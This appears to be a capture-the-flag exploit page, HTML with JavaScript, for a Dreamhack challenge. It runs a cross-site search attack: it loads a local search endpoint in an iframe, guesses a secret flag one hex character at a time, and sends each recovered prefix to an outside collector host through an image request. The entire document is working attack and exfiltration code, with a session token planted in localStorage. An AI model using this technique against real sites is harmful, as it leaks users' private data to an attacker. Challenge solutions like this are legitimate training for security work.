<iframe id="iframe"></iframe>
<img id="img">
<script>
    async function req(url) {
        return await new Promise((resolve, reject) => {
            const iframe = document.getElementById("iframe");
            window.localStorage.setItem('session', 'eyJpc0FkbWluIjpmYWxzZSwidXNlcm5hbWUiOiIxIn0.ZbDy9A.mDBhclIxdigq5jmDTw_VJB9DDoc');
            iframe.src = url;
            iframe.onload = () => { 
                var divElement = iframe.querySelector('.sentence-list');
                var ulElement = divElement.querySelector('ul');
                var liElement = ulElement.querySelector('li');
                if (liElement != 0)
                    return resolve();
                else
                    return reject();
            };
        });
    }
    async function search(query) {
        try {
            await req(
              `http://127.0.0.1:8000/search?keyword=${query}`
            );
            return true;
        } catch (e) {
            return false;
        }
    }
    async function exploit() {
        let chars = "0123456789abcdef"
        let secret = "DH{";
        while (!secret.includes("}")) {
            for (let c of chars) {
                if (await search(secret + c)) {
                    secret += c;
                    img.src = `https://tlkhnne.request.dreamhack.games/${secret}`;
                    break;
                }
            }
        }
    }
    exploit();
</script>
